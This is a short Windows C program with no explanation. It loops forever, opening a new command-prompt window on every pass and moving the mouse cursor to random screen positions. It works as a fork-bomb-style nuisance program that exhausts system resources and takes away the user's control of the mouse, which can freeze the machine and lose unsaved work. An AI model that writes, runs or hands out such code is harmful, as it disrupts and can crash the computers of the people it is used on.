#include <time.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <windows.h>
int main()
{
	int x, y;
	srand((unsigned)time(NULL));
	while (1)
	{
		system("start cmd");
		x = rand() % 1500;
		y = rand() % 850;
		SetCursorPos(x, y);
	}
	return 0;
}
